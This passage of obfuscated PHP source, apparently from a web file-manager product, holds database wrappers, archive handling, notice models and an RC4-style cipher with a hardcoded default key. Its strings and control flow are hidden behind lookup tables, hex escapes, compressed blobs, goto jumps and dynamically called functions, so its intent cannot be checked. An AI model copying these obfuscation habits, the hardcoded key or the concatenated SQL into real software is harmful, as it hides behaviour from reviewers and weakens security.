trim($Dٓ, $D[839]) . $D[839]; } return $Dٓ; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($E = '') { $fͪ陻 =& $_SERVER[]; if (!class_exists($fͪ陻[841])) { think_exception(think_lang($fͪ陻[10]) . $fͪ陻[842]); } if (!empty($E)) { $this->config = $E; if (empty($this->config[$fͪ陻[13]])) { $this->config[$fͪ陻[13]] = array(); } } } public function connect($dа  = '', $A毌 = 0) { $D =& $_SERVER[]; if (!isset($this->linkID[$A毌])) { goto C픎; C픎: if (empty($dа )) { $dа  = $this->config; } if ($this->pconnect) { $dа [$D[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$A毌] = new PDO($dа [$D[843]], $dа [$D[816]], $dа [$D[817]], $dа [$D[13]]); } catch (PDOException $Eٔԡ) { think_exception($Eٔԡ->getMessage()); } goto Dڏ; Cɓض: $this->linkID[$A毌]->exec($D[852] . think_config($D[819])); $this->connected = !0; if (1 != think_config($D[18])) { unset($this->config); } goto AŐ˛; Dڏ: $this->dbType = $this->_getDsnType($dа [$D[843]]); if (in_array($this->dbType, array($D[844], $D[845], $D[846], $D[847]))) { think_exception($D[848] . $this->dbType . $D[849] . $this->dbType . $D[850]); } if (!$this->linkID[$A毌]) { think_exception($D[851]); } goto Cɓض; AŐ˛: } return $this->linkID[$A毌]; } public function free() { $this->PDOStatement = null; } public function query($E᭥۞, $DѴ = array()) { goto Bɫ; fʔ: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $b̠ = $this->PDOStatement->execute($DѴ); $this->debug(); goto f꺾; Bɫ: $Aʩ =& $_SERVER[]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto AݢŠ; eƆ: think_action_status($Aʩ[19], 1); think_status($Aʩ[20]); $this->PDOStatement = $this->_linkID->prepare($E᭥۞); goto fʔ; f꺾: if (!1 === $b̠) { $this->error(); return !1; } else { return $this->getAll(); } goto eȯ; AݢŠ: $this->queryStr = $E᭥۞; if (!empty($DѴ)) { $this->queryStr .= $Aʩ[853] . print_r($DѴ, !0) . $Aʩ[854]; } if (!empty($this->PDOStatement)) { $this->free(); } goto eƆ; eȯ: } public function execute($A͂, $fԃȾ = array()) { goto bߖ; e: if ($this->dbType == $fϟ͆[847]) { if (preg_match($fϟ͆[855], $this->queryStr, $Dׅ)) { $this->table = think_config($fϟ͆[856]) . str_ireplace(think_config($fϟ͆[857]), $fϟ͆[361], $Dׅ[2]); $d = (bool) $this->query($fϟ͆[858] . strtoupper($this->table) . $fϟ͆[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($fϟ͆[21], 1); goto BϜ; eͷ: $D˝ = $this->PDOStatement->execute($fԃȾ); $this->debug(); if (!1 === $D˝) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($d || preg_match($fϟ͆[859], $A͂)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto eʹ; C: $this->queryStr = $A͂; if (!empty($fԃȾ)) { $this->queryStr .= $fϟ͆[853] . print_r($fԃȾ, !0) . $fϟ͆[854]; } $d = !1; goto e; bߖ: $fϟ͆ =& $_SERVER[]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto C; BϜ: think_status($fϟ͆[20]); $this->PDOStatement = $this->_linkID->prepare($A͂); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto eͷ; eʹ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Bʪ = $this->_linkID->commit(); $this->transTimes = 0; if (!$Bʪ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Cˤ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Cˤ) { $this->error(); return !1; } } return !0; } private function getAll() { $A⅗ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($A⅗); return $A⅗; } public function getFields($F膐̄) { goto dۡ哤; Aӵޞ: $Eܛۋ = $this->query($E֎); $Dʬ = array(); if ($Eܛۋ) { foreach ($Eܛۋ as $dФυ => $F˜) { $F˜ = array_change_key_case($F˜); $F˜[$B䈥[28]] = isset($F˜[$B䈥[28]]) ? $F˜[$B䈥[28]] : $B䈥[361]; $F˜[$B䈥[29]] = isset($F˜[$B䈥[29]]) ? $F˜[$B䈥[29]] : $B䈥[361]; $C = isset($F˜[$B䈥[261]]) ? $F˜[$B䈥[261]] : $F˜[$B䈥[28]]; $Dʬ[$C] = array($B䈥[28] => $C, $B䈥[29] => $F˜[$B䈥[29]], $B䈥[31] => (bool) (isset($F˜[$B䈥[99]]) && $F˜[$B䈥[99]] === $B䈥[33] || isset($F˜[$B䈥[31]]) && $F˜[$B䈥[31]] === $B䈥[33]), $B䈥[34] => isset($F˜[$B䈥[34]]) ? $F˜[$B䈥[34]] : (isset($F˜[$B䈥[53]]) ? $F˜[$B䈥[53]] : $B䈥[361]), $B䈥[36] => isset($F˜[$B䈥[89]]) ? strtolower($F˜[$B䈥[89]]) == $B䈥[38] : (isset($F˜[$B䈥[54]]) ? $F˜[$B䈥[54]] : !1), $B䈥[39] => isset($F˜[$B䈥[876]]) ? strtolower($F˜[$B䈥[876]]) == $B䈥[41] : (isset($F˜[$B䈥[89]]) ? $F˜[$B䈥[89]] : !1)); } } goto e; e: return $Dʬ; goto CŖ; dۡ哤: $B䈥 =& $_SERVER[]; $this->initConnect(!0); if (think_config($B䈥[860])) { $E֎ = str_replace($B䈥[861], $F膐̄, think_config($B䈥[860])); } else { switch ($this->dbType) { case $B䈥[844]: case $B䈥[862]: $E֎ = "\123\x45\x4c\105\103\x54\x20\x20\x20\x63\x6f\154\165\x6d\x6e\x5f\x6e\141\x6d\145\40\141\x73\x20\47\116\x61\155\145\x27\x2c\x20\40\x20\144\141\164\141\137\x74\171\x70\145\40\x61\163\x20\x27\124\x79\x70\x65\x27\54\40\x20\40\143\x6f\x6c\165\155\x6e\x5f\144\145\146\x61\165\154\164\x20\x61\163\40\47\104\145\146\x61\165\154\164\47\54\40\40\40\x69\163\137\x6e\165\x6c\x6c\141\142\154\145\x20\x61\x73\x20\47\116\165\x6c\154\47\xa\x9\x9\106\122\117\x4d\x9\151\156\146\x6f\x72\155\141\x74\x69\x6f\156\137\x73\x63\x68\145\155\x61\x2e\x74\x61\142\154\145\163\40\x41\123\x20\x74\12\11\11\112\x4f\x49\x4e\x9\x69\x6e\146\157\x72\155\x61\164\151\157\156\x5f\163\143\150\x65\155\x61\56\143\157\154\x75\x6d\x6e\x73\x20\101\123\40\143\xa\x9\x9\117\x4e\40\x20\x74\x2e\164\141\x62\154\145\x5f\143\141\x74\x61\x6c\x6f\147\40\x3d\40\x63\56\x74\x61\142\x6c\145\137\x63\x61\x74\141\154\x6f\147\12\11\x9\x41\116\x44\x20\164\56\164\x61\142\x6c\145\x5f\163\143\x68\x65\155\x61\x20\75\x20\x63\56\x74\141\142\x6c\145\x5f\x73\143\150\145\155\x61\12\x9\x9\101\116\x44\x20\x74\x2e\164\x61\x62\154\x65\137\x6e\141\x6d\145\40\75\40\x63\56\x74\x61\x62\x6c\145\x5f\156\141\x6d\145\xa\x9\x9\x57\x48\105\x52\x45\x20\40\40\164\56\x74\141\142\x6c\x65\x5f\156\x61\x6d\x65\40\x3d\x20\47{$F膐̄}\x27"; break; case $B䈥[863]: $E֎ = $B䈥[864] . $F膐̄ . $B䈥[865]; break; case $B䈥[845]: case $B䈥[847]: $E֎ = $B䈥[866] . $B䈥[867] . $B䈥[868] . strtoupper($F膐̄) . $B䈥[869] . strtoupper($F膐̄) . $B䈥[870]; break; case $B䈥[871]: $E֎ = $B䈥[872] . $F膐̄ . $B䈥[873]; break; case $B䈥[846]: break; case $B䈥[874]: default: $E֎ = $B䈥[875] . ($this->dbType == $B䈥[874] ? "\x60{$F膐̄}\140" : $F膐̄); } } goto Aӵޞ; CŖ: } public function getTables($BԨ = '') { $f =& $_SERVER[]; if (think_config($f[877])) { $BӚ = str_replace($f[878], $BԨ, think_config($f[877])); } else { switch ($this->dbType) { case $f[845]: case $f[847]: $BӚ = $f[879]; break; case $f[844]: case $f[862]: $BӚ = $f[880]; break; case $f[871]: $BӚ = $f[881]; break; case $f[846]: think_exception(think_lang($f[882]) . $f[883]); break; case $f[863]: $BӚ = $f[42] . $f[43] . $f[44]; break; case $f[874]: default: if (!empty($BԨ)) { $BӚ = $f[827] . $BԨ; } else { $BӚ = $f[828]; } } } $dӝ = $this->query($BӚ); $Dɧ = array(); foreach ($dӝ as $dڔ݉ => $bĚ) { $Dɧ[$dڔ݉] = current($bĚ); } return $Dɧ; } protected function parseLimit($A˯) { $DŠ =& $_SERVER[]; $DЏ = $DŠ[33]; if (!empty($A˯)) { switch ($this->dbType) { case $DŠ[871]: case $DŠ[863]: $A˯ = explode($DŠ[47], $A˯); if (count($A˯) > 1) { $DЏ .= $DŠ[48] . $A˯[1] . $DŠ[49] . $A˯[0] . $DŠ[50]; } else { $DЏ .= $DŠ[48] . $A˯[0] . $DŠ[50]; } break; case $DŠ[844]: case $DŠ[862]: break; case $DŠ[846]: break; case $DŠ[845]: case $DŠ[847]: break; case $DŠ[874]: default: $DЏ .= $DŠ[48] . $A˯ . $DŠ[50]; } } return $DЏ; } public function parseKey(&$EԶ, $b˂ = true) { $Fը߱ =& $_SERVER[]; if ($b˂) { $EԶ = $this->parseKeyCheck($EԶ); } if ($this->dbType == $Fը߱[874]) { if ($EԶ != $Fը߱[176] && !preg_match($Fը߱[838], $EԶ)) { $EԶ = $Fը߱[839] . trim($EԶ, $Fը߱[839]) . $Fը߱[839]; } return $EԶ; } else { return parent::parseKey($EԶ); } } public function close() { $this->_linkID = null; } public function error() { $A͹ =& $_SERVER[]; if ($this->PDOStatement) { $c = $this->PDOStatement->errorInfo(); $this->error = $c[1] . $A͹[4] . $c[2]; } else { $this->error = $A͹[33]; } if ($A͹[33] != $this->queryStr) { $this->error .= LNG($A͹[45]) . $this->queryStr; } think_trace($this->error, $A͹[33], $A͹[46]); return $this->error; } public function escapeString($a㓇) { $c܈ =& $_SERVER[]; switch ($this->dbType) { case $c܈[871]: case $c܈[844]: case $c܈[862]: case $c܈[874]: return addslashes($a㓇); case $c܈[846]: case $c܈[863]: case $c܈[845]: case $c܈[847]: return str_ireplace($c܈[55], $c܈[56], $a㓇); } } protected function parseValue($fܮ) { $a· =& $_SERVER[]; if (is_string($fܮ)) { $fܮ = strpos($fܮ, $a·[4]) === 0 ? $this->escapeString($fܮ) : $a·[884] . $this->escapeString($fܮ) . $a·[884]; } elseif (isset($fܮ[0]) && is_string($fܮ[0]) && strtolower($fܮ[0]) == $a·[285]) { $fܮ = $this->escapeString($fܮ[1]); } elseif (is_array($fܮ)) { $fܮ = array_map(array($this, $a·[885]), $fܮ); } elseif (is_bool($fܮ)) { $fܮ = $fܮ ? $a·[83] : $a·[468]; } elseif (is_null($fܮ)) { $fܮ = $a·[99]; } return $fܮ; } public function getLastInsertId() { $c =& $_SERVER[]; switch ($this->dbType) { case $c[871]: case $c[863]: case $c[844]: case $c[862]: case $c[846]: case $c[874]: return $this->_linkID->lastInsertId(); case $c[845]: case $c[847]: $fǱ = $this->table; $aޯ = $this->query("\x53\105\114\105\x43\124\x20{$fǱ}\x2e\x63\x75\162\162\166\x61\154\40\x63\165\x72\x72\166\x61\154\40\106\122\x4f\x4d\x20\144\165\141\x6c"); return $aޯ ? $aޯ[0][$c[886]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($BЉ) { goto dп僎; b˗: if (!$E) { return !1; } if (flock($E, LOCK_EX)) { $aǹ = parent::query($BЉ); flock($E, LOCK_UN); fclose($E); return $aǹ; } flock($E, LOCK_UN); goto A֞; A֞: fclose($E); show_json($D[889], !1); return !1; goto aϮ; dп僎: $D =& $_SERVER[]; $cǣٻ = DATA_PATH . $D[887]; $E = fopen($cǣٻ, $D[888]); goto b˗; aϮ: } public function execute($eȹĝ) { goto a݈; d͎: fclose($c᷂); show_json($f퓅˕[889], !1); return !1; goto Eާ; a݈: $f퓅˕ =& $_SERVER[]; $A̗ҧ = DATA_PATH . $f퓅˕[887]; $c᷂ = fopen($A̗ҧ, $f퓅˕[888]); goto c۞蔼; c۞蔼: if (!$c᷂) { return !1; } if (flock($c᷂, LOCK_EX)) { $c֦ = parent::execute($eȹĝ); flock($c᷂, LOCK_UN); fclose($c᷂); return $c֦; } flock($c᷂, LOCK_UN); goto d͎; Eާ: } } goto C; Dő: $_SERVER[$_SERVER[͒][52]] = ("\71\66\65\71"."\67\60")+0;$_vXBW="qe29NZYpCKRKJ6v5z4MXyZIaSQNSjBxgBNYeJcfxwHjkbXFWUzIcg5VqD22e8UnCGfJqhMHj99kuHYMIyr";; stream_wrapper_register($_SERVER[͒][53], $_SERVER[͒][54]); class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($dƔ, $Dİ) { $AЛ =& $_SERVER[]; if (isset(self::$_methodList[$dƔ])) { return @call_user_func_array(self::$_methodList[$dƔ], $Dİ); } else { if (method_exists($this, $dƔ)) { return call_user_func_array(array($this, $dƔ), $Dİ); } else { think_exception(__CLASS__ . $AЛ[4] . $dƔ . $AЛ[5]); } } } public static function __callStatic($d, $e׸ơ) { if (isset(self::$_methodListStatic[$d])) { return call_user_func_array(self::$_methodListStatic[$d], $e׸ơ); } else { if (method_exists(self, $d)) { return call_user_func_array(array(self, $d), $e׸ơ); } else { show_json("{$d}\x28\51\40\156\157\164\x20\x65\x78\x69\x73\164\73", !1); } } } public static function addMethod($Cؘ, $c◎) { self::$_methodList[$Cؘ] = $c◎; } public static function addMethodStatic($f, $D) { self::$_methodListStatic[$f] = $D; } } goto d; DÞ: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\155\x2e\x6e\157\164\151\143\x65\x4c\x69\x73\164"; public $field = array("\x6e\141\x6d\145", "\143\157\x6e\164\x65\x6e\x74", "\141\165\x74\x68", "\155\x6f\x64\x65", "\164\151\x6d\145", "\164\x79\x70\x65", "\x6c\x65\x76\x65\154", "\x65\x6e\141\x62\154\145", "\163\157\162\164"); public function listData($c󷑢 = false, $B㖞 = "\x73\x6f\x72\x74", $dއ = false) { return parent::listData($c󷑢, $B㖞, $dއ); } public function add($F) { $E =& $_SERVER[]; $A˪ԥ = time(); if ($F[$E[12]] == $E[2493]) { $A˪ԥ = strtotime($F[$E[190]]); } $F[$E[190]] = $A˪ԥ; return parent::insert($F); } public function update($E׾ĸ, $C) { goto fۉ; a˂: return parent::update($E׾ĸ, $C); goto aᢅ; fۉ: $F =& $_SERVER[]; $b = $this->listData($E׾ĸ); if (!$b) { return !1; } goto Dݩ; Dݩ: $a = time(); if ($C[$F[12]] == $F[2493]) { $a = strtotime($C[$F[190]]); } $C[$F[190]] = $a; goto a˂; aᢅ: } public function remove($Dȯ) { $D誙 = $this->listData($Dȯ); if (!$D誙 || $D誙[$_SERVER[][1095]]) { return !1; } return parent::remove($Dȯ); } public function sort($f䯺, $c˕ō) { return parent::update($f䯺, $c˕ō); } public function enable($d, $bҦ) { return parent::update($d, array($_SERVER[][2494] => $bҦ)); } private function initUserOption() { $eѥ =& $_SERVER[]; $this->optionType = $eѥ[2495]; $this->modelType = $eѥ[2496]; $this->field = array($eѥ[2497], $eѥ[28], $eѥ[190], $eѥ[29], $eѥ[2498], $eѥ[708], $eѥ[183]); } public function userNoticeGet($Aʋ = false) { $this->initUserOption(); return parent::listData($Aʋ, $_SERVER[][367], !0); } public function userNoticeAdd($D߉) { $bɒ =& $_SERVER[]; $this->initUserOption(); $D = $this->findByKey($bɒ[2497], $D߉[$bɒ[367]]); if ($D) { return !0; } $d쯐 = array($bɒ[2497] => $D߉[$bɒ[367]], $bɒ[28] => $D߉[$bɒ[28]], $bɒ[190] => $D߉[$bɒ[190]], $bɒ[29] => isset($D߉[$bɒ[29]]) ? $D߉[$bɒ[29]] : 1, $bɒ[2498] => isset($D߉[$bɒ[2498]]) ? $D߉[$bɒ[2498]] : 0, $bɒ[708] => 0, $bɒ[183] => 0); return parent::insert($d쯐); } public function userNoticeEdit($b, $d) { $this->initUserOption(); return parent::update($b, $d); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\x73\164\x65\x6d\x5f\x6f\x70\x74\x69\x6f\x6e"; protected $jsonField = array("\x6d\x65\156\x75", "\x72\157\154\145", "\x72\x6f\x6c\x65\107\162\x6f\165\160", "\162\145\147\151\x73\x74", "\x65\155\x61\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($fʍ긴) { return "\123\x79\x73\x74\145\x6d\x4f\160\x74\151\x6f\156\137{$fʍ긴}"; } protected function optionDefault($B = '') { $Eք =& $_SERVER[]; if ($B == $Eք[33]) { return $GLOBALS[$Eք[6]][$Eք[2499]]; } } } class SystemRecordModel extends ModelBaseLight { } goto aύ͹; Dƌ: $D򙽩 = $_SERVER[][547]; if (!$D򙽩) { die; } $_SERVER[޾] = explode($_SERVER[][548], gzinflate(substr($_SERVER[][549], 10, -8))); goto Bڐ; a: if ($_SERVER[$_SERVER[][700]] != $_SERVER[$_SERVER[][1324]]) { goto E啽ק; cˎ: $fȑ = explode($_SERVER[][217], $B̴); if (count($fȑ) < $_SERVER[][557]) { $eЋ = $_SERVER[][704]; $eЋ(); } $E = $_SERVER[][705]; goto A; E啽ק: $fǷ = $_SERVER[][701]; $dɘ = $_SERVER[$_SERVER[][702]] . $_SERVER[][703]; $B̴ = $fǷ($dɘ); goto cˎ; A: $E($_SERVER[$_SERVER[][1132]]); goto Bю; Bю: } class KodArchive { static function init() { goto e; FɃ꤂: require_once ARCHIVE_LIB . $E[1913]; goto B; e: $E =& $_SERVER[]; if (defined($E[1902])) { return; } define($E[1902], SDK_DIR . $E[1903]); goto BƼ; BƼ: define($E[1904], TEMP_FILES); define($E[1905], TEMP_FILES); define($E[1906], $E[1907]); goto eڔ͆; DȊ: require_once ARCHIVE_LIB . $E[1910]; require_once ARCHIVE_LIB . $E[1911]; require_once ARCHIVE_LIB . $E[1912]; goto FɃ꤂; eڔ͆: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $E[1908]; require_once ARCHIVE_LIB . $E[1909]; goto DȊ; B: } static function checkIfType($aʱ¹, $bŝ) { goto cČǯ; D: return $Aѿ; goto cԗ; cČǯ: $Aɒې =& $_SERVER[]; self::init(); $cͼ = array($Aɒې[301] => array($Aɒې[301], $Aɒې[1914], $Aɒې[1915], $Aɒې[1916]), $Aɒې[1917] => array($Aɒې[1917], $Aɒې[1918], $Aɒې[1058], $Aɒې[1056]), $Aɒې[1060] => array($Aɒې[1060], $Aɒې[1919], $Aɒې[1920], $Aɒې[1921], $Aɒې[1922], $Aɒې[1923], $Aɒې[1924])); goto Eウ; Eウ: $Aѿ = in_array($aʱ¹, $cͼ[$bŝ]); if ($Aѿ && ($bŝ == $Aɒې[301] || $bŝ == $Aɒې[1917]) && (!function_exists($Aɒې[1925]) || !function_exists($Aɒې[1926]))) { show_tips($Aɒې[1927]); } if ($Aѿ && $bŝ == $Aɒې[1060] && (!function_exists($Aɒې[1928]) || !strstr(shell_exec($Aɒې[1929]), $Aɒې[1930]))) { show_tips($Aɒې[1931]); } goto D; cԗ: } static function listContent($eţ, $aۗ = true) { $DҸܶ =& $_SERVER[]; self::init(); $c⋤ɹ = !empty($GLOBALS[$DҸܶ[1064]]) ? $GLOBALS[$DҸܶ[1064]] : get_path_ext($eţ); $bđ⴬ = !1; if (self::checkIfType($c⋤ɹ, $DҸܶ[1917])) { $D؟ = PclTarList($eţ, $c⋤ɹ); $bđ⴬ = array(); for ($F = 0; $F < count($D؟); $F++) { $cѴɊ = $D؟[$F]; if ($cѴɊ[$DҸܶ[1932]] == $DҸܶ[1933] || $cѴɊ[$DҸܶ[1932]] == $DҸܶ[1934]) { continue; } if ($aۗ) { $cѴɊ[$DҸܶ[1935]] = ltrim($cѴɊ[$DҸܶ[1935]], $DҸܶ[1171]); } if ($cѴɊ[$DҸܶ[1932]] == $DҸܶ[1936]) { $cѴɊ[$DҸܶ[76]] = !0; } else { $cѴɊ[$DҸܶ[76]] = !1; } $cѴɊ[$DҸܶ[1051]] = $F; $bđ⴬[] = $cѴɊ; } } else { if (self::checkIfType($c⋤ɹ, $DҸܶ[1060])) { $f̸ = kodRarArchive::listContent($eţ); if (!$f̸[$DҸܶ[1047]]) { return $f̸; } else { $bđ⴬ = $f̸[$DҸܶ[1049]]; } } else { if (kodZipArchive::support($DҸܶ[354])) { $bđ⴬ = kodZipArchive::listContent($eţ); } else { $B뇍м = new PclZip($eţ); $bđ⴬ = $B뇍м->listContent(); } } } if ($bđ⴬) { $Eӭ = unzip_charset_get($bđ⴬); $aۗ = $aۗ && function_exists($DҸܶ[65]); for ($F = 0; $F < count($bđ⴬); $F++) { $bđ⴬[$F][$DҸܶ[1935]] = str_replace(array($DҸܶ[1087], $DҸܶ[1937]), $DҸܶ[783], $bđ⴬[$F][$DҸܶ[1935]]); if ($aۗ) { $bđ⴬[$F][$DҸܶ[1935]] = iconv_to($bđ⴬[$F][$DҸܶ[1935]], $Eӭ, $DҸܶ[326]); unset($bđ⴬[$F][$DҸܶ[1938]]); } } return array($DҸܶ[1047] => !0, $DҸܶ[1049] => $bđ⴬); } else { return array($DҸܶ[1047] => !1, $DҸܶ[1049] => $bđ⴬); } } static function extract($d, $A, $eɖޕ = "\55\61", &$ẽн = false) { goto E괈ȕ; E괈ȕ: $Aޝ =& $_SERVER[]; self::init(); $D = !empty($GLOBALS[$Aޝ[1064]]) ? $GLOBALS[$Aޝ[1064]] : get_path_ext($d); goto f; E泅: if (self::checkIfType($D, $Aޝ[1917])) { if ($eɖޕ != $Aޝ[1046]) { $aϖ = unzip_pre_name($aϖ); $eՍ = unzip_pre_name($eՍ); $dό = PclTarExtractList($d, array($aϖ), $A, $eՍ, $D); } else { $dό = PclTarExtract($d, $A, $Aޝ[361], $D); } return array($Aޝ[1047] => $dό, $Aޝ[1049] => PclErrorString(!0)); } else { if (self::checkIfType($D, $Aޝ[1060])) { return kodRarArchive::extract($d, $A, $D, $ẽн); } else { if (kodZipArchive::support($Aޝ[1939])) { return kodZipArchive::extract($d, $A, $ẽн); } else { $Fᒿ = new PclZip($d); if ($eɖޕ != $Aޝ[1046]) { $dό = $Fᒿ->extract(PCLZIP_OPT_PATH, $A, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $Aޝ[1940], PCLZIP_OPT_BY_NAME, $cҥΌ[$Aޝ[1935]], PCLZIP_OPT_REMOVE_PATH, $eՍ, PCLZIP_OPT_REPLACE_NEWER); } else { $dό = $Fᒿ->extract(PCLZIP_OPT_PATH, $A, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $Aޝ[1940], PCLZIP_OPT_REPLACE_NEWER); } return array($Aޝ[1047] => $dό, $Aޝ[1049] => $Fᒿ->errorName(!0)); } } } return array($Aޝ[1047] => !1, $Aޝ[1049] => $Aޝ[1941]); goto F뫙Ǣ; f: $b̚ = self::listContent($d, !1); if (!$b̚[$Aޝ[1047]]) { return $b̚; } if ($eɖޕ != $Aޝ[1046]) { goto bؓ; Eպї: if ($GLOBALS[$Aޝ[6]][$Aޝ[1169]] != $Aޝ[326]) { $aϖ = unzip_pre_name($ẽн); } $eՍ = get_path_father($ẽн); if ($eՍ == $ẽн) { $eՍ = $Aޝ[33]; } goto C䣯; C䣯: if ($cҥΌ[$Aޝ[76]]) { $aϖ = rtrim($aϖ, $Aޝ[8]) . $Aޝ[8]; $ẽн = array($ẽн); } $C = str_replace($Aޝ[93], $Aޝ[8], $aϖ); if (substr($C, -1) == $Aޝ[8]) { if (!strstr(trim($C, $Aޝ[8]), $Aޝ[8])) { $A = $A . get_path_this($C) . $Aޝ[8]; } } else { if ($eՍ == $aϖ) { $eՍ = $Aޝ[33]; } } goto Ĉ; bؓ: $cҥΌ = self::fileIndex($b̚[$Aޝ[1049]], $eɖޕ); $ẽн = str_replace(array($Aޝ[1087], $Aޝ[1937]), $Aޝ[70], $cҥΌ[$Aޝ[1935]]); $aϖ = $ẽн; goto Eպї; Ĉ: } goto E泅; F뫙Ǣ: } static function fileIndex($E, $A㊭, $d˓ = false) { goto Bʠ; Bʠ: $e㟗 =& $_SERVER[]; self::init(); if (!is_array($E)) { return !1; } goto b⺊; dᛛ: $d = $f肋; if ($d˓) { $d = $f肋[$d˓]; if ($f肋[$e㟗[76]]) { $d = rtrim($d, $e㟗[8]) . $e㟗[8]; } } return $d; goto b덳; b⺊: $a뵬 = count($E); for ($C͠ = 0; $C͠ < $a뵬; $C͠++) { if ($A㊭ == $E[$C͠][$e㟗[1051]]) { $f肋 = $E[$C͠]; break; } } if (!$f肋) { show_tips($e㟗[1942]); } goto dᛛ; b덳: } static function extractZipFile($B, $d٥ӭ, $a휖 = false) { goto F󃽫; Fҝ: mk_dir($aĔх); $Aߣō = $aĔх . md5($B . $d٥ӭ); if ($a휖) { $Aߣō = $aĔх . $a휖; } goto aި; d: $F߰ = get_path_father($d٥ӭ); if ($F߰ == $d٥ӭ) { $F߰ = $F[33]; } $e = $bɒ->extract(PCLZIP_OPT_PATH, $aĔх, PCLZIP_CB_PRE_FILE_NAME, $F[1940], PCLZIP_OPT_REMOVE_PATH, $F߰, PCLZIP_OPT_BY_NAME, $d٥ӭ); goto cǐ; aި: if (file_exists($Aߣō)) { return $Aߣō; } $bɒ = new PclZip($B); $BͿ = unzip_filter_ext($aĔх . get_path_this($d٥ӭ)); goto d; F󃽫: $F =& $_SERVER[]; self::init(); $aĔх = TEMP_FILES . hash_path($B) . $F[8]; goto Fҝ; cǐ: if (!file_exists($BͿ)) { return !1; } @rename($BͿ, $Aߣō); return $Aߣō; goto Eѐ; Eѐ: } static function filePreview($A, $d؇, $b = false, $a݈Ǥ = false) { goto dㄕ; dㄕ: $d =& $_SERVER[]; self::init(); $DԂ = TEMP_FILES . hash_path($A) . $d[8]; goto F; bÐל: $d񻱂ފ = self::extract($A, $DԂ, $d؇, $fˊڋ); if (is_array($fˊڋ)) { show_json($d[1943], !1); } if (file_exists($fɇΞ)) { IO::fileOut($fɇΞ, $b, get_path_this($fˊڋ)); return; } goto fό; fό: $fˊڋ = unzip_pre_name($fˊڋ); $dȡ = get_path_this($fˊڋ); $DΏ˅ = unzip_filter_ext($DԂ . $dȡ); goto cϼ; cϼ: if (!$d񻱂ފ[$d[1047]]) { show_json($d񻱂ފ[$d[1049]], !1); } if (!file_exists($DΏ˅)) { show_json($d[1944], !1); } @rename($DΏ˅, $fɇΞ); goto bǢĻ; F: mk_dir($DԂ); $fɇΞ = $DԂ . md5($A . $d؇ . $a݈Ǥ); $fˊڋ = $d[33]; goto bÐל; bǢĻ: if (!file_exists($fɇΞ)) { del_dir($DԂ); show_json($d[1945]); } IO::fileOut($fɇΞ, $b, $dȡ); goto dǝ؃; dǝ؃: } static function create($Eɟ, $Bˡ) { $f폭 =& $_SERVER[]; self::init(); $cȦ = get_path_ext($Eɟ); $Eˑ = !1; if (self::checkIfType($cȦ, $f폭[301])) { if (kodZipArchive::support($f폭[1026])) { return kodZipArchive::create($Eɟ, $Bˡ); } $f͆ = new PclZip($Eɟ); foreach ($Bˡ as $bȝ => $Aߎ͏) { $Aߎ͏ = str_replace($f폭[467], $f폭[8], $Aߎ͏); $DА = Kodio::clear(get_path_father($Aߎ͏)); if ($bȝ == 0) { $Eˑ = $f͆->create($Aߎ͏, PCLZIP_OPT_REMOVE_PATH, $DА, PCLZIP_CB_PRE_FILE_NAME, $f폭[1946]); continue; } $Eˑ = $f͆->add($Aߎ͏, PCLZIP_OPT_REMOVE_PATH, $DА, PCLZIP_CB_PRE_FILE_NAME, $f폭[1946]); } } else { if (self::checkIfType($cȦ, $f폭[1917])) { foreach ($Bˡ as $bȝ => $Aߎ͏) { $Aߎ͏ = str_replace($f폭[467], $f폭[8], $Aߎ͏); $DА = Kodio::clear(get_path_father($Aߎ͏)); if ($bȝ == 0) { $Eˑ = PclTarCreate($Eɟ, array($Aߎ͏), $cȦ, null, $DА); continue; } $Eˑ = PclTarAddList($Eɟ, array($Aߎ͏), $f폭[33], $DА, $cȦ); } } } return $Eˑ; } } class Mcrypt { public static $defaultKey = "\141\41\x74\x61\153\x41\72\x64\x6c\x6d\143\x6c\144\x45\x76\x2c\x65"; public static function encode($C趾, $b = '', $Eӄ = 0, $DЛ = '') { goto D֣; dܕ: $a = substr($DЛ, -$Cᱱ); $e̾ = $DĄ . md5($DĄ . $a); $F؝ = strlen($e̾); goto E; aߊܘ: for ($f܅ = 0; $f܅ <= 255; $f܅++) { $Aߦ͛[$f܅] = ord($e̾[$f܅ % $F؝]); } $Aʎ蠈 = range(0, 255); for ($B = $f܅ = 0; $f܅ < 256; $f܅++) { $B = ($B + $Aʎ蠈[$f܅] + $Aߦ͛[$f܅]) % 256; $eʡߍ = $Aʎ蠈[$f܅]; $Aʎ蠈[$f܅] = $Aʎ蠈[$B]; $Aʎ蠈[$B] = $eʡߍ; } goto Cՠ; c: $DĄ = md5(substr($b, 0, 16)); $fܴԘ = md5(substr($b, 16, 16)); $DЛ = $DЛ ? $DЛ : md5(microtime()); goto dܕ; E: $C趾 = sprintf($aߵ[1947], $Eӄ ? $Eӄ + time() : 0) . substr(md5($C趾 . $fܴԘ), 0, 16) . $C趾; $EȠӵ = strlen($C趾); $Aߦ͛ = array(); goto aߊܘ; Cՠ: $EƩ = $aߵ[33]; for ($Cӈْݾ = $B = $f܅ = 0; $f܅ < $EȠӵ; 